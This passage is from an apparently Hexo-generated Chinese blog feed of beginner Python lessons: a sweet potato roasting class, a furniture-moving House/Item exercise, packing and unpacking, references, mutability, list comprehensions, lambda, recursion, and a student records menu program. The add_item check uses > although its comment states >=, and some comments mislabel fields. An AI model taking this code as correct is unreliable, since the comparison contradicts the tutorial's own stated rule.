self.cooked_time += time        # 3.2 根据 烧烤总时间, 设置地瓜的状态：        if 0 &lt;= self.cooked_time &lt; 3:            self.state = &#39;生的&#39;        elif 3 &lt;= self.cooked_time &lt; 6:            self.state = &#39;半生不熟&#39;        elif 6 &lt;= self.cooked_time &lt; 8:            self.state = &#39;熟了&#39;        else:            self.state = &#39;烤糊了&#39;</code></pre><h5 id="2-3-5-测试代码"><a href="#2-3-5-测试代码" class="headerlink" title="2.3.5 测试代码"></a>2.3.5 测试代码</h5><p>把上面 3 块代码合并为一个程序后，在代码的下面添加以下代码进行测试：</p><pre><code class="python"># 4.1 创建 地瓜对象sp = SweetPotato()print(sp)  # 输出地瓜信息# 4.2 分多次烧烤地瓜sp.cook(2)print(sp)  # 4.3 每烧烤一次，输出地瓜信息sp.cook(5)print(sp)sp.cook(2)print(sp)</code></pre><p>运行结果：</p><pre><code class="shell">地瓜状态为：生的, 烧烤总时间为：0 分钟地瓜状态为：生的, 烧烤总时间为：2 分钟地瓜状态为：熟了, 烧烤总时间为：7 分钟地瓜状态为：烤糊了, 烧烤总时间为：9 分钟</code></pre><h3 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h3><h4 id="3-1-烤地瓜需求拓展"><a href="#3-1-烤地瓜需求拓展" class="headerlink" title="3.1 烤地瓜需求拓展"></a>3.1 烤地瓜需求拓展</h4><ol><li>地瓜可以添加佐料,如 盐、孜然、辣酱等</li><li>输出地瓜信息时，可以显示地瓜的状态、烧烤总时间、以及添加过的所有佐料</li></ol><h4 id="3-2-需求分析"><a href="#3-2-需求分析" class="headerlink" title="3.2 需求分析"></a>3.2 需求分析</h4><ul><li><strong>每个地瓜记录自己的佐料，定义属性来记录</strong></li><li>地瓜可以添加多个佐料，应该定义 <strong>容器类型属性</strong> 来记录添加的佐料</li><li>地瓜类 应该 <strong>定义方法来实现添加佐料的功能</strong></li></ul><h4 id="3-3-示例代码"><a href="#3-3-示例代码" class="headerlink" title="3.3 示例代码"></a>3.3 示例代码</h4><h5 id="3-3-1-步骤流程"><a href="#3-3-1-步骤流程" class="headerlink" title="3.3.1 步骤流程"></a>3.3.1 步骤流程</h5><pre><code class="python"># 5. 拓展功能# 5.1 添加属性 condiments， 列表类型，默认为空列表# 5.2 修改 __str__ 返回信息，返回增加已添加的佐料信息# 5.3 定义 add_condiments(self, temp), temp为添加什么佐料的参数    # 5.3.1 佐料列表追加元素# 5.4 再次测试代码，添加佐料，重新打印信息</code></pre><h5 id="3-3-2-添加-condiments-属性"><a href="#3-3-2-添加-condiments-属性" class="headerlink" title="3.3.2 添加 condiments 属性"></a>3.3.2 添加 <code>condiments</code> 属性</h5><pre><code class="python">    # 1. 定义__init__方法，添加3个属性    def __init__(self):        # 1.1 默认状态state是生的        self.state = &#39;生的&#39;        # 1.2 默认时间cooked_time是0        self.cooked_time = 0        # 5.1 添加属性 condiments， 列表类型，默认为空列表        self.condiments = []</code></pre><h5 id="3-3-3-修改-str-方法，在方法中使用condiments属性显示已添加的佐料"><a href="#3-3-3-修改-str-方法，在方法中使用condiments属性显示已添加的佐料" class="headerlink" title="3.3.3 修改__str__()方法，在方法中使用condiments属性显示已添加的佐料"></a>3.3.3 修改<code>__str__()</code>方法，在方法中使用<code>condiments</code>属性显示已添加的佐料</h5><pre><code class="python">    # 2. 定义__str__方法    def __str__(self):        # 2.1 返回地瓜状态，烧烤总时间        # 5.2 修改 __str__ 返回信息，返回增加已添加的佐料信息        return f&#39;地瓜状态为：{self.state}, 烧烤总时间为：{self.cooked_time} 分钟，包括的佐料为：{self.condiments}&#39;</code></pre><h5 id="3-3-4-定义add-condiments-方法"><a href="#3-3-4-定义add-condiments-方法" class="headerlink" title="3.3.4 定义add_condiments()方法"></a>3.3.4 定义<code>add_condiments()</code>方法</h5><pre><code class="python">    # 5.3 定义 add_condiments(self, temp), temp为添加什么佐料的参数    def add_condiment(self, temp):        # 5.3.1 佐料列表追加元素        self.condiments.append(temp)</code></pre><h5 id="3-3-5-再次测试"><a href="#3-3-5-再次测试" class="headerlink" title="3.3.5 再次测试"></a>3.3.5 再次测试</h5><pre><code class="python"># 4.1 创建 地瓜对象sp = SweetPotato()print(sp)  # 输出地瓜信息# 4.2 分多次烧烤地瓜sp.cook(2)# 添加佐料sp.add_condiment(&#39;番茄酱&#39;)print(sp)  # 4.3 每烧烤一次，输出地瓜信息sp.cook(5)sp.add_condiment(&#39;孜然&#39;)print(sp)sp.cook(2)sp.add_condiment(&#39;烤肉&#39;)print(sp)</code></pre><p>运行结果：</p><pre><code class="python">地瓜状态为：生的, 烧烤总时间为：0 分钟，包括的佐料为：[]地瓜状态为：生的, 烧烤总时间为：2 分钟，包括的佐料为：[&#39;番茄酱&#39;]地瓜状态为：熟了, 烧烤总时间为：7 分钟，包括的佐料为：[&#39;番茄酱&#39;, &#39;孜然&#39;]地瓜状态为：烤糊了, 烧烤总时间为：9 分钟，包括的佐料为：[&#39;番茄酱&#39;, &#39;孜然&#39;, &#39;烤肉&#39;]</code></pre><h2 id="应用-搬家具"><a href="#应用-搬家具" class="headerlink" title="应用: 搬家具"></a>应用: 搬家具</h2><h3 id="1-需求说明-1"><a href="#1-需求说明-1" class="headerlink" title="1. 需求说明"></a>1. 需求说明</h3><p>搬家具规则：</p><ol><li>家具分不同的类型，并占用不同的面积</li><li>输出家具信息时，显示家具的类型和家具占用的面积</li><li>房子有自己的地址和占用的面积</li><li>房子可以添加家具，如果房子的剩余面积可以容纳家具，则提示家具添加成功；否则提示添加失败</li><li>输出房子信息时，可以显示房子的地址、占地面积、剩余面积</li></ol><h3 id="2-面向对象设计-1"><a href="#2-面向对象设计-1" class="headerlink" title="2. 面向对象设计"></a>2. 面向对象设计</h3><h3 id="2-1-家具类"><a href="#2-1-家具类" class="headerlink" title="2.1 家具类"></a>2.1 家具类</h3><ol><li><p>使用 <code>Item</code> 类可以创建 <strong>家具对象</strong></p></li><li><p>家具有两个属性：</p><ul><li><strong>家具类型 type</strong>：字符串</li><li><strong>家具面积 area</strong>：整数</li></ul></li><li><p>实现</p><pre><code>__str__</code></pre><p>方法</p><ul><li>显示家具的 type 和 area 属性</li></ul></li></ol><h3 id="2-2-房子类"><a href="#2-2-房子类" class="headerlink" title="2.2 房子类"></a>2.2 房子类</h3><ol><li><p>使用 <code>Home</code> 类可以创建 <strong>房子对象</strong></p></li><li><p>房子有三个属性：</p><ul><li><strong>地址 address</strong>：字符串</li><li><strong>房子面积 area</strong>：整数</li><li><strong>房子剩余面积 free_area</strong>：整数，默认为房子的面积</li></ul></li><li><p>实现</p><pre><code>__str__</code></pre><p>方法</p><ul><li>显示房子的 address 、area、free_area 属性</li></ul></li><li><p>实现</p><pre><code>add_item</code></pre><p>方法，提供</p><pre><code>item</code></pre><p>参数来添加家具</p><ul><li>如果</li></ul></li></ol><pre><code> 可以容纳家具： - 打印添加家具的类型和面积 - **剩余面积** 减少</code></pre><ul><li>如果 <strong>不能容纳家具：</strong> 提示家具添加失败</li></ul><h3 id="2-3-主程序逻辑"><a href="#2-3-主程序逻辑" class="headerlink" title="2.3 主程序逻辑"></a>2.3 主程序逻辑</h3><ol><li>创建 <strong>家具对象</strong>, 输出 家具信息</li><li>创建 <strong>房子对象</strong>, 输出 房子信息</li><li><strong>房子添加家具</strong>, 输出 房子信息</li></ol><h3 id="2-4-示例代码"><a href="#2-4-示例代码" class="headerlink" title="2.4. 示例代码"></a>2.4. 示例代码</h3><pre><code class="python">&quot;&quot;&quot;家具类 Item# 1. 定义__init__方法，添加2个属性，需要2个形参 _type, _area    # 1.1 家具类型 type    # 1.2 家具面积 area# 2. 实现__str__方法    # 2.1 返回家具类型和家具面积房子类 Home# 1. 定义__init__方法，添加3个属性，需要3个形参    # 1.1 地址 address    # 1.2 房子面积 area    # 1.3 房子剩余面积 free_area，默认为房子的面积# 2. 实现__str__方法    # 2.1 返回房子地址、面积、剩余面积信息# 3. 实现add_item方法，提供item参数来添加家具，item是对象    # 3.1 如果 房间的剩余面积 &gt;= 家具的面积，可以容纳家具：        # 3.1.1 打印添加家具的类型和面积        # 3.1.2 剩余面积 减少    # 3.2 否则 不能容纳家具：提示家具添加失败主程序逻辑：# 1. 创建 家具对象, 输出 家具信息# 2. 创建 房子对象, 输出 房子信息# 3. 房子添加家具, 输出 房子信息&quot;&quot;&quot;class Item(object):    &quot;&quot;&quot;家具类&quot;&quot;&quot;    # 1. 定义__init__方法，添加2个属性，需要2个形参 _type, _area    def __init__(self, _type, _area):        # 1.1 地址 address        self.type = _type        # 1.2 家具面积 area        self.area = _area    # 2. 实现__str__方法    def __str__(self):        # 2.1 返回房子地址、面积、剩余面积信息        return f&#39;家具类型为：{self.type}, 家具面积为：{self.area}&#39;class House(object):    &quot;&quot;&quot;房子类&quot;&quot;&quot;    # 1. 定义__init__方法，添加3个属性，需要3个形参    def __init__(self, _addr, _area, _free_area):        # 1.1 地址 address        self.address = _addr        # 1.2 房子面积 area        self.area = _area        # 1.3 房子剩余面积 free_area，默认为房子的面积        self.free_area = _free_area    # 2. 实现__str__方法    def __str__(self):        # 2.1 返回房子地址、面积、剩余面积信息        return f&#39;房子地址：{self.address}, 房子面积：{self.area}, 房子剩余面积：{self.free_area}&#39;    # 3. 实现add_item方法，提供item参数来添加家具，item是家具对象    def add_item(self, item):        # 3.1 如果 房间的剩余面积 &gt;= 家具的面积，可以容纳家具：        if self.free_area &gt; item.area:            # 3.1.1 打印添加家具的类型和面积            print(f&#39;添加{item.type}成功了，家具占用面积为：{item.area}&#39;)            # 3.1.2 剩余面积 减少            self.free_area -= item.area        # 3.2 否则 不能容纳家具： 提示家具添加失败        else:            print(&#39;家具添加失败&#39;)# 1. 创建 家具对象, 输出 家具信息# 2. 创建 房子对象, 输出 房子信息# 3. 房子添加家具, 输出 房子信息h = House(&#39;北京&#39;, 70, 70)  # 创建房间对象hprint(h)  # 打印房子对象，获取House中__str__返回的信息tv = Item(&#39;超大电视&#39;, 10)  # 创建家具1print(tv)  # 打印家具对象，输出Item中__str__返回的信息h.add_item(tv)  # 房子添加家具print(h)  # 打印房子对象，获取House中__str__返回的信息bed = Item(&#39;超大床&#39;, 20)  # 创建家具2print(bed)  # 打印家具对象，输出Item中__str__返回的信息h.add_item(bed)  # 房子添加家具print(h)</code></pre><p>运行结果：</p><pre><code class="python">房子地址：北京, 房子面积：70, 房子剩余面积：70家具类型为：超大电视, 家具面积为：10添加超大电视成功了，家具占用面积为：10房子地址：北京, 房子面积：70, 房子剩余面积：60家具类型为：超大床, 家具面积为：20添加超大床成功了，家具占用面积为：20房子地址：北京, 房子面积：70, 房子剩余面积：40</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础05-函数强化和进阶</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8005-%E5%87%BD%E6%95%B0%E5%BC%BA%E5%8C%96%E5%92%8C%E8%BF%9B%E9%98%B6/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8005-%E5%87%BD%E6%95%B0%E5%BC%BA%E5%8C%96%E5%92%8C%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="强化和进阶"><a href="#强化和进阶" class="headerlink" title="强化和进阶"></a>强化和进阶</h1><h1 id="函数强化和进阶"><a href="#函数强化和进阶" class="headerlink" title="函数强化和进阶"></a>函数强化和进阶</h1><h2 id="一、组包和拆包"><a href="#一、组包和拆包" class="headerlink" title="一、组包和拆包"></a>一、组包和拆包</h2><h3 id="1-组包"><a href="#1-组包" class="headerlink" title="1. 组包"></a>1. 组包</h3><ul><li>= 右边有多个数据时, 会自动包装为元组</li></ul><pre><code class="python"># 组包，1, 2, 3封装成元组再赋值，多变一result = 10, 20, 30print(result, type(result))  # (10, 20, 30) &lt;class &#39;tuple&#39;&gt;</code></pre><h3 id="2-拆包"><a href="#2-拆包" class="headerlink" title="2. 拆包"></a>2. 拆包</h3><ul><li>如果 <strong>变量数量 = 容器长度</strong>, 容器中的元素会一一对应赋值给变量</li><li>拆包时要注意，需要拆的数据的个数要与变量的个数相同，否则程序会异常</li><li>除了对元组拆包之外，还可以对列表、字典等拆包</li></ul><pre><code class="python"># 拆包，一变多a, b, c = (10, 20, 30)print(a)  # 10print(b)  # 20print(c)  # 30</code></pre><h3 id="3-应用场景"><a href="#3-应用场景" class="headerlink" title="3. 应用场景"></a>3. 应用场景</h3><h4 id="3-1-交换变量的值"><a href="#3-1-交换变量的值" class="headerlink" title="3.1 交换变量的值"></a>3.1 交换变量的值</h4><pre><code class="python">a = 10b = 20a, b = b, a  # 先自动组包，后自动解包(拆包)</code></pre><h4 id="3-2-函数可以同时返回多个数"><a href="#3-2-函数可以同时返回多个数" class="headerlink" title="3.2 函数可以同时返回多个数"></a>3.2 函数可以同时返回多个数</h4><pre><code class="python"># 函数可以同时返回多个数def return_arg():    return 1, 2, 3# 函数调用# 变量名 = 函数()ret = return_arg()print(ret)# 返回值直接做拆包r1, r2, r3 = return_arg()print(r1, r2, r3)</code></pre><h4 id="3-3-字典元素拆包"><a href="#3-3-字典元素拆包" class="headerlink" title="3.3 字典元素拆包"></a>3.3 字典元素拆包</h4><pre><code class="python">info_dict = {&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34}# 遍历字典，取出每一个itemfor temp in info_dict.items():    print(temp)     # 元组：(key, value)    key, value = temp   # 元组拆包    print(key, value)</code></pre><h2 id="二、引用"><a href="#二、引用" class="headerlink" title="二、引用"></a>二、引用</h2><h3 id="1-引用"><a href="#1-引用" class="headerlink" title="1. 引用"></a>1. 引用</h3><ul><li><p>引用：是一个变量或值的另一个名字，又称别名</p><ul><li>赋值本质：给右边的变量或值，起一个别名</li></ul></li><li><p>可以使用id函数查看变量的引用地址，</p><p>引用地址相等，说明指向同一个内存空间</p><ul><li>每一次运行程序，每次地址都可能不一样</li></ul></li></ul><pre><code class="python"># a 是 10 的引用，10的别名是a，操作a就是操作10a = 10print(id(a), id(10))  # 地址id一样，指向同一个内存空间</code></pre><h3 id="2-引用指向改变"><a href="#2-引用指向改变" class="headerlink" title="2. 引用指向改变"></a>2. 引用指向改变</h3><pre><code class="python"># a 是 10 的引用，10的别名是a，操作a就是操作10a = 10print(id(a), id(10))  # 地址id一样，指向同一个内存空间# b 是 a 的引用，b的别名是a，操作a就是操作bb = aprint(id(b), id(a))  # 地址id一样，指向同一个内存空间print(a, b)  # 10 10# b 是 20 的引用，20的别名是b，操作b就是操作20# b已经和上面的a没有关系，现在是20的别名b = 20print(b, id(b)) # 和a的地址不一样了，说明b和a没有关系</code></pre><h3 id="3-函数传参是引用传递"><a href="#3-函数传参是引用传递" class="headerlink" title="3. 函数传参是引用传递"></a>3. 函数传参是引用传递</h3><ul><li>函数传参是引用传递</li></ul><pre><code class="python"># 给函数传参是引用传递# 带参数函数定义def func(num):    print(&#39;func = &#39;, id(num))# 给函数传参，变量传参a = 10print(&#39;func调用前 = &#39;, id(a))func(a)print(&#39;func调用后 = &#39;, id(a))</code></pre><p>运行结果：</p><pre><code class="python">func调用前 =  4404906944func =  4404906944func调用后 =  4404906944</code></pre><h2 id="三、可变类型与不可变类型"><a href="#三、可变类型与不可变类型" class="headerlink" title="三、可变类型与不可变类型"></a>三、可变类型与不可变类型</h2><h3 id="1-可变类型和不可变类型"><a href="#1-可变类型和不可变类型" class="headerlink" title="1. 可变类型和不可变类型"></a>1. 可变类型和不可变类型</h3><ol><li>可变类型: 在存储空间中可以直接修改的数据类型<ul><li>列表 list</li><li>字典 dict</li><li>集合set</li></ul></li><li>不可变类型: 在存储空间中不可以直接修改的数据类型<ul><li>数值类型 int, bool, float</li><li>字符串 str</li><li>元组 tuple</li></ul></li></ol><pre><code class="python">&quot;&quot;&quot;可变类型: 列表、字典、集合不可变类型: 数字类型(int, bool, float)、字符串、元组可变类型：在地址不变的情况下，可以修改内容不可变类型: 在地址不变的情况下，不可修改内容&quot;&quot;&quot;# 验证列表是可变类型my_list = [&#39;a&#39;, &#39;b&#39;]print(&#39;改之前的地址：&#39;, id(my_list))my_list.append(&#39;c&#39;)  # 追加元素print(&#39;改之后的地址：&#39;, id(my_list))  # 地址和改之前一样print(my_list)  # [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]print(&#39;=&#39; * 20)# 验证int是不可变类型a = 10print(&#39;改之前的地址：&#39;, id(a))a = 20  # a是20的别名，重新指向新的空间，和前面的a没有关系，不是改前面的内容print(&#39;改之后的地址：&#39;, id(a))  # 和改之前地址不一样了print(a)  # 20</code></pre><h2 id="四、range"><a href="#四、range" class="headerlink" title="四、range"></a>四、range</h2><h3 id="1-range的使用"><a href="#1-range的使用" class="headerlink" title="1. range的使用"></a>1. range的使用</h3><ul><li>range() 方法可创建一个整数列表对象，一般用在 for 循环中<ul><li>range(开始位置, 结束位置，步长)<ul><li>和切片用法差不多</li></ul></li></ul></li></ul><pre><code class="python"># 1. 打印：0、1、2、3、4# for i in range(5):  # [0, 5)for i in range(0, 5):  # [0, 5)    print(i)# 2. 1~100的累加# 2.1 定义辅助变量_sum = 0# 2.2 for 控制循环范围for i in range(1, 101):    # 2.3 累加    _sum += i# 2.4 在循环外面打印累加结果print(_sum)# 3. 验证步长，打印：0、2、4for i in range(0, 5, 2):  # [0, 5)    print(i)</code></pre><h2 id="五、列表推导式"><a href="#五、列表推导式" class="headerlink" title="五、列表推导式"></a>五、列表推导式</h2><h3 id="1-列表推导式"><a href="#1-列表推导式" class="headerlink" title="1. 列表推导式"></a>1. 列表推导式</h3><ul><li>列表推导式：快速生成列表元素的表达形式，通过for添加列表元素的简洁写法</li><li>推导式基本格式： [计算公式 for 循环 if 判断]</li><li>特点：<ul><li>每循环一次，将计算公式的结果添加到列表中</li><li>计算公式可以使用遍历出的数据</li><li>for 遍历出的数据 必须满足 if 判断 才会使用计算公式生成元素</li></ul></li></ul><pre><code class="python"># 普通方法：遍历0~4范围的元素，这些元素添加到列表中# 1. 空列表new_list = []# 2. range(5)遍历取数for i in range(5):    # 2.1 取出来的元素追加到列表    new_list.append(i)# 3. 循环外面，打印结果print(new_list)print(&#39;=&#39;*30)# 通过列表推导式，实现上面的效果 [计算公式 for循环体]# 1. for i in range(5), 取出0，放在i变量中，i追加到列表# 2. 循环下一步，取出2，放在i变量中，i追加到列表# 重复，直到退出循环new_list2 = [i for i in range(5)]print(new_list2)print(&#39;=&#39;*30)# 0~10之间数，偶数才添加到列表# 普通方法实现# 1. 空列表new_list = []# 2. range(11)遍历取数for i in range(11):    # 2.1 取出来的元素是偶数的话，追加到列表    # 2.2 i % 2 == 0, i 对 2求余，结果为0，就是偶数    if i % 2 == 0:        new_list.append(i)# 3. 循环外面，打印结果print(new_list)print(&#39;=&#39;*30)# 列表推导式实现# [i for i in range(11) if i % 2 == 0]# 1. for i in range(11)取第一个元素# 2. if i % 2 == 0# 3. 上面满足条件的i, 条件到列表new_list2 = [i for i in range(11) if i % 2 == 0]print(new_list2)</code></pre><p>运行结果：</p><pre><code class="python">[0, 1, 2, 3, 4]==============================[0, 1, 2, 3, 4]==============================[0, 2, 4, 6, 8, 10]==============================[0, 2, 4, 6, 8, 10]</code></pre><h2 id="六、匿名函数"><a href="#六、匿名函数" class="headerlink" title="六、匿名函数"></a>六、匿名函数</h2><h3 id="1-匿名函数"><a href="#1-匿名函数" class="headerlink" title="1. 匿名函数"></a>1. 匿名函数</h3><ul><li>匿名函数是简单普通函数的简洁写法</li><li>定义的函数没有名字,这样的函数叫做<strong>匿名函数</strong></li></ul><p>匿名函数的语法结构：</p><pre><code class="python">lambda [形参1], [形参2], ... : [单行表达式] 或 [函数调用]</code></pre><p>示例代码:</p><pre><code class="python"># 无参有返回值匿名函数# a) 匿名函数整体就是函数名字， 函数名字()就是函数调用ret = (lambda: 1 + 1)()print(ret)# b) 给匿名函数起一个函数名字，函数名字()就是调用函数func = lambda: 1 + 1  # 给匿名函数起一个函数名字叫funcret = func()  # 返回值变量 = 函数名()print(ret)print(&#39;=&#39; * 30)# 有参有返回值匿名函数# a. 直接调用匿名函数ret = (lambda a, b: a - b)(30, 10)print(ret)# b. 先给匿名函数起名，再调用func = lambda a, b: a - bret = func(30, 10)print(ret)</code></pre><ul><li>匿名函数中不能使用 <strong>while 循环、for 循环</strong>，只能编写单行的表达式，或函数调用</li><li>匿名函数中返回结果<strong>不需要使用 return</strong>，表达式的运行结果就是返回结果</li><li>匿名函数中也可以不返回结果。例如： <code>lambda : print(&#39;hello world&#39;)</code></li></ul><h2 id="七、递归函数"><a href="#七、递归函数" class="headerlink" title="七、递归函数"></a>七、递归函数</h2><h3 id="1-什么是递归函数"><a href="#1-什么是递归函数" class="headerlink" title="1. 什么是递归函数"></a>1. 什么是递归函数</h3><ul><li>如果 <strong>一个函数在内部调用其本身</strong>，这个函数就是 <strong>递归函数</strong>。</li><li>递归函数一般会在特定情况下<strong>不再调用函数本身</strong>（一定要有出口），否则会导致到达最大递归次数, 程序报错</li></ul><h3 id="2-通过递归函数实现阶乘"><a href="#2-通过递归函数实现阶乘" class="headerlink" title="2. 通过递归函数实现阶乘"></a>2. 通过递归函数实现阶乘</h3><p><strong>阶乘的规律：</strong></p><pre><code class="shell">1! = 1  2! = 2 × 1 = 2 × 1!  3! = 3 × 2 × 1 = 3 × 2!  4! = 4 × 3 × 2 × 1 = 4 × 3!  ...  n! = n × (n-1)!</code></pre><p>示例代码：</p><pre><code class="python"># 1. 定义函数(参数)def func(n):    # 2. 如果我是 1 ，直接返回 1    if n == 1:        return 1    # 3. 否则，返回 n * 函数调用自己(n-1)    else:        ret = n * func(n-1)        return ret# 函数调用_ret = func(3)print(_ret)</code></pre><h2 id="八、enumerate、del"><a href="#八、enumerate、del" class="headerlink" title="八、enumerate、del"></a>八、enumerate、del</h2><h3 id="1-enumerate-的使用"><a href="#1-enumerate-的使用" class="headerlink" title="1. enumerate 的使用"></a>1. enumerate 的使用</h3><ul><li>通过 for 配合 enumerate 遍历容器同时获取元素索引位置、元素</li></ul><p>示例代码：</p><pre><code class="python">user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;},             {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}]# 遍历列表，同时把索引位置能打印# 普通方法实现# 1. 定义索引位置变量i = 0# 2. for遍历列表，打印：索引、元素for user_dict in user_list:    print(i, user_dict)    # 3. 索引位置+1    i += 1print(&#39;==&#39;*20)# 通过enumerate方法实现# enumerate(容器变量)：获取到：元素位置，元素for i, user_dict in enumerate(user_list):    print(i, user_dict)</code></pre><p>运行结果：</p><pre><code class="shell">0 {&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;}1 {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}========================================0 {&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;}1 {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}</code></pre><h3 id="2-通过del删除列表元素"><a href="#2-通过del删除列表元素" class="headerlink" title="2. 通过del删除列表元素"></a>2. 通过del删除列表元素</h3><ul><li>通过del删除列表元素：<code>del 列表[索引]</code></li></ul><p>示例代码：</p><pre><code class="python">user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;},             {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}]# 通过del删除列表元素 del 列表[索引位置]print(user_list)    # [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}]# 删除索引位置为0的元素del user_list[0]print(user_list) # [{&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}]</code></pre><h2 id="九、学生名片管理系统"><a href="#九、学生名片管理系统" class="headerlink" title="九、学生名片管理系统"></a>九、学生名片管理系统</h2><h3 id="1-示例代码"><a href="#1-示例代码" class="headerlink" title="1. 示例代码"></a>1. 示例代码</h3><pre><code class="python"># 0. 函数的外面，定义一个全局变量(列表)，用于保存用户信息user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: &#39;110&#39;},             {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 18, &#39;tel&#39;: &#39;120&#39;}]# 显示菜单函数定义def show_menu():    print(&#39;=&#39; * 20)    print(&#39;= 1. 添加学生&#39;)    print(&#39;= 2. 查询所有学生&#39;)    print(&#39;= 3. 查询某个学生&#39;)    print(&#39;= 4. 修改某个学生&#39;)    print(&#39;= 5. 删除某个学生&#39;)    print(&#39;= 6. 退出系统&#39;)    print(&#39;=&#39; * 20)# 定义新建学生的函数def add_stu_info():    &quot;&quot;&quot;添加学生信息&quot;&quot;&quot;    # 1. 输入用户信息：姓名、年龄、电话    _name = input(&#39;请输入学生姓名：&#39;)    _age = int(input(&#39;请输入学生年龄：&#39;))  # 年龄应该是整型，所有做了int转换    _tel = input(&#39;请输入学生电话：&#39;)    # 2. 通过for遍历，取出某个元素后，这个元素就是字典    for user_dict in user_list:        # 2.1 字典[‘name’] == 用户输入的名字，是否相等，相等则跳出循环        if user_dict[&#39;name&#39;] == _name:            print(&#39;此用户已经存在，请重来&#39;)            # 2.2 break跳出循环            break    else:        # 3. for中的else 如果用户不存在列表中，添加用户字典到列表        # 3.1 创建字典        info_dict = {&#39;name&#39;: _name, &#39;age&#39;: _age, &#39;tel&#39;: _tel}        # 3.2 追加列表        # user_list是可变类型，没有重新赋值，没有改变原来地址，所以不用global声明        user_list.append(info_dict)# 显示所有的学生，带序号的def show_all_stu():    &quot;&quot;&quot;显示所有的学生&quot;&quot;&quot;    # 1. 遍历前，打印一些提示信息：序号    姓名  年龄  电话    # \t一个tab键的空格    print(&#39;序号\t\t姓名\t\t年龄\t\t电话&#39;)    # 2. 遍历 for 索引位置，字典 in enumerate(user_list)：    for i, user_dict in enumerate(user_list):        # 2.1 打印一个用户的信息 索引位置+1，user_dict[‘name’]……        print(&#39;%d\t\t%s\t\t%d\t\t%s&#39; % (i + 1, user_dict[&#39;name&#39;], user_dict[&#39;age&#39;], user_dict[&#39;tel&#39;]))# 显示某个学生def show_one_stu():    &quot;&quot;&quot;显示某个学生&quot;&quot;&quot;    # 1. 输入姓名    _name = input(&#39;请输入学生姓名：&#39;)    # 2. 通过for遍历，取出一个字典user_dict    for user_dict in user_list:        # 2.1 user_dict[‘name’]和输入姓名判断        if user_dict[&#39;name&#39;] == _name:            # 2.1.1 如果相等，输出用户信息，退出循环            print(&#39;查询到的用户信息如下：&#39;)            print(&#39;%s\t%d\t%s&#39; % (user_dict[&#39;name&#39;], user_dict[&#39;age&#39;], user_dict[&#39;tel&#39;]))            break    # 3. for中的else，循环执行完毕，没有break，说明用户不存在，提示一下    else:        print(&#39;查询的用户不存在&#39;)def update_stu_by_name():    &quot;&quot;&quot;更新某个学生信息，根据输入的姓名匹配哪个学生&quot;&quot;&quot;    # 1. 输入需要修改的用户姓名    update_name = input(&#39;输入需要修改的用户姓名：&#39;)    # 2. for遍历，带索引的遍历   i, user_dict  in user_list    for i, user_dict in enumerate(user_list):        # 2.1 如果user_dict[&#39;name&#39;]和输入用户名字相等        if user_dict[&#39;name&#39;] == update_name:            # 2.1.1 重新输入新的姓名、年龄、电话            _name = input(&#39;请输入新的学生姓名：&#39;)            _age = int(input(&#39;请输入新的学生年龄：&#39;))            _tel = input(&#39;请输入新的学生电话：&#39;)            # 2.1.2 对user_list[i][&#39;name&#39;] = 新的name            user_list[i][&#39;name&#39;] = _name            user_list[i][&#39;age&#39;] = _age            user_list[i][&#39;tel&#39;] = _tel            # 2.1.3 ……、修改成功打印、break跳出循环            print(&#39;修改成功&#39;)            break    # 3. for中的else 输入的用户不在列表    else:        print(&#39;输入的用户不在列表，请重新输入&#39;)def del_stu_by_name():    &quot;&quot;&quot;删除某个学生，根据输入的姓名&quot;&quot;&quot;    # 1. 输入用户姓名    _name = input(&#39;请输入需要删除的名字：&#39;)    # 2. for遍历，带索引的遍历   i, user_dict    for i, user_dict in enumerate(user_list):        # 2.1 如果user_dict[&#39;name&#39;]和输入用户名字相等        if user_dict[&#39;name&#39;] == _name:            # 2.1.1 del 列表[i], 同时break跳出循环            del user_list[i]            print(&#39;删除成功&#39;)            break    # 3. for中else 输入的用户在列表中，不存在    else:        print(&#39;用户不在列表中，无法删除&#39;)# 写一个主程序def main():    # 1. 死循环    while True:        # 调用菜单        show_menu()        # 2. 用户输入数字        cmd = input(&quot;请输入功能数字：&quot;)        # 3. 条件选择        if cmd == &quot;1&quot;:            # print(&#39;添加学生&#39;)            add_stu_info()            # print(user_list) # 打印列表，做测试，看数据        elif cmd == &quot;2&quot;:            # print(&#39;查询所有学生&#39;)            show_all_stu()        elif cmd == &quot;3&quot;:            # print(&#39;查询某个学生&#39;)            show_one_stu()        elif cmd == &quot;4&quot;:            # print(&#39;修改某个学生&#39;)            update_stu_by_name()        elif cmd == &quot;5&quot;:            # print(&#39;删除某个学生&#39;)            del_stu_by_name()        elif cmd == &quot;6&quot;:            print(&#39;退出循环&#39;)            break        else:            print(&#39;输入有误，请重新输入&#39;)# 